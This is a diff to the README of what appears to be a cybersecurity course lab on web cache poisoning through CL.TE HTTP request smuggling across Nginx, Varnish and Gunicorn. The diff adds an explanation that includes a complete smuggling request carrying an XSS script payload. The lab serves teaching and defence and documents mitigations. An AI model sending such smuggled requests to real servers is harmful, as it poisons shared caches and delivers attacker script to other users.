@@ -1,8 +1,29 @@
 # HRS-Desynchronization
 
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker)](docker-compose.yml)
+[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python)](exploit/attack.py)
+
 > **Cybersecurity Course Project** – Professional lab demonstrating
 > **Web Cache Poisoning via CL.TE HTTP Request Smuggling** in a three-tier
 > architecture (Nginx → Varnish → Gunicorn/Flask).
+
+---
+
+## Table of Contents
+
+- [Architecture Overview](#architecture-overview)
+- [How It Works](#how-it-works)
+- [Repository Layout](#repository-layout)
+- [Phase 1 – Setup](#phase-1--setup)
+- [Phase 2 – Exploit](#phase-2--exploit-web-cache-poisoning-via-clte)
+- [Phase 3 – Mitigation](#phase-3--mitigation)
+- [Teardown](#teardown)
+- [Key Concepts](#key-concepts)
+- [References & Further Reading](#references--further-reading)
+- [Author](#author)
+- [Disclaimer](#disclaimer)
+- [License](#license)
 
 ---
 
@@ -61,13 +82,73 @@ sequenceDiagram
     N-->>U: <html><body>PAYLOAD</body></html>
 ```
 
-### Header trust matrix
+### Header Trust Matrix
 
 | Layer | Trusts | Ignores | Effect |
 |-------|--------|---------|--------|
 | **Nginx** (frontend-proxy) | `Content-Length` | `Transfer-Encoding` | Forwards entire body including smuggled suffix |
 | **Varnish** (cache-layer) | Forwards headers as-is | Does not strip TE | Passes the TE header to Gunicorn |
 | **Gunicorn** (backend-origin) | `Transfer-Encoding: chunked` | `Content-Length` | Stops at `0\r\n\r\n`, leaves prefix in socket buffer |
+
+---
+
+## How It Works
+
+### The Core Conflict: Content-Length vs. Transfer-Encoding
+
+HTTP/1.1 provides two mechanisms to indicate the length of a request body:
+
+| Mechanism | How It Works |
+|-----------|-------------|
+| **Content-Length (CL)** | A single integer: "the body is exactly *N* bytes long." |
+| **Transfer-Encoding: chunked (TE)** | The body is sent in pieces. Each chunk begins with a hex size; a chunk of size `0` terminates the message. |
+
+When **both** headers are present in the same request, RFC 7230 §3.3.3 says a server **must** ignore `Content-Length` and use `Transfer-Encoding`. However, not all proxies and servers agree – and that disagreement is the attack.
+
+### Phase 1 – Smuggling (Injection)
+
+The attacker crafts a single `POST` request containing **both** headers:
+
+```
+POST /js/app.js HTTP/1.1
+Host: target.com
+Content-Length: 108         ← Nginx counts 108 bytes of body
+Transfer-Encoding: chunked  ← Gunicorn follows this instead
+
+6\r\n
+CLTE=1\r\n
+0\r\n
+\r\n                        ← Gunicorn stops HERE (end of chunked body)
+GET /reflect?q=<script>alert('XSS')</script> HTTP/1.1\r\n
+Host: target.com\r\n
+Content-Length: 500\r\n
+X-Ignore:                   ← smuggled prefix left in socket buffer
+```
+
+- **Nginx** trusts `Content-Length` → forwards all 108 bytes to Varnish/Gunicorn.
+- **Gunicorn** trusts `Transfer-Encoding` → reads only up to `0\r\n\r\n` and returns `200 OK`.
+- The remaining bytes (`GET /reflect?q=…`) are **left in the TCP socket buffer**.
+
+### Phase 2 – Trigger (Desynchronization)
+
+The attacker immediately sends a normal `GET /js/app.js` on the **same TCP connection**. Varnish forwards it to Gunicorn on the same keep-alive socket.
+
+Gunicorn reads from its socket buffer and sees:
+
+```
+GET /reflect?q=<script>alert('XSS')</script> HTTP/1.1   ← smuggled bytes
+Host: target.com
+Content-Length: 500
+X-Ignore: GET /js/app.js HTTP/1.1                        ← victim's request absorbed
+Host: target.com
+...
+```
+
+Gunicorn processes `GET /reflect?q=…` and returns the XSS payload. Varnish **caches this response under the `/js/app.js` cache key**.
+
+### Phase 3 – Impact (Cache Poisoning)
+
+Every subsequent user requesting `/js/app.js` receives the attacker's cached payload directly from Varnish (`X-Cache: HIT`). The poisoned content is served until the cache TTL expires (1 hour in this lab).
 
 ---
 
@@ -93,7 +174,6 @@ HRS-Desynchronization/
 ├── mitigation/
 │   ├── nginx.conf              # Hardened: reject dual-length headers, strip TE
 │   └── default.vcl             # Hardened: strip TE, Connection:close to origin
-├── exploit.py                  # (Legacy) two-tier CL.TE PoC (Nginx → Gunicorn)
 └── README.md
 ```
 
@@ -254,9 +334,53 @@ docker compose down
 
 ---
 
+## Key Concepts
+
+| Concept | Why It Matters |
+|---------|---------------|
+| **TCP Connection Reuse** (keep-alive) | The smuggled bytes survive in the socket buffer *only* if the connection stays open between requests. `Connection: close` discards them. |
+| **No Header Normalization** | Modern proxies "clean" headers by default. The vulnerable Nginx config deliberately passes `Transfer-Encoding` through without stripping – a real-world misconfiguration. |
+| **Byte-level Precision** | If `Content-Length` is off by even one byte, the smuggled request is malformed and Gunicorn returns `400 Bad Request`. The exploit calculates CL dynamically. |
+| **Cache Key Mismatch** | Varnish hashes the *URL from the incoming request* (`/js/app.js`) but stores the *response from the backend* (which processed `/reflect?q=…` due to the desync). |
+| **Chunked Transfer-Encoding** | The `0\r\n\r\n` terminator is the "wall" where Gunicorn stops reading. Everything after it is left for the next `recv()` call. |
+
+---
+
+## References & Further Reading
+
+| Resource | Link |
+|----------|------|
+| RFC 7230 §3.3.3 – Message Body Length | [tools.ietf.org/html/rfc7230#section-3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3) |
+| PortSwigger – HTTP Request Smuggling | [portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling) |
+| James Kettle – "HTTP Desync Attacks" (DEF CON 27) | [youtube.com/watch?v=w-eJM2Pc0KI](https://www.youtube.com/watch?v=w-eJM2Pc0KI) |
+| Albinowax – "HTTP/2: The Sequel is Always Worse" | [portswigger.net/research/http2](https://portswigger.net/research/http2) |
+| OWASP – HTTP Request Smuggling | [owasp.org/www-community/attacks/HTTP_Request_Smuggling](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling) |
+| Varnish Cache Documentation | [varnish-cache.org/docs](https://varnish-cache.org/docs/) |
+| Nginx Proxy Module Reference | [nginx.org/en/docs/http/ngx_http_proxy_module.html](https://nginx.org/en/docs/http/ngx_http_proxy_module.html) |
+
+---
+
+## Author
+
+**Laksh Mendpara** – Cybersecurity Course Project
+
+---
+
 ## Disclaimer
 
-This project is created **solely for educational purposes** as part of a
-cybersecurity course.  Do **not** use these techniques against systems you do
-not own or have explicit written permission to test.
+> **⚠️ Educational Use Only**
+>
+> This project is created **solely for educational purposes** as part of a
+> cybersecurity course.  Do **not** use these techniques against systems you do
+> not own or have explicit written permission to test.
+>
+> **Academic Integrity:** If you are a student, refer to your institution's
+> academic integrity policy before using this material.  Submitting this work
+> as your own without attribution may constitute a violation of your
+> institution's honour code.
 
+---
+
+## License
+
+This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.
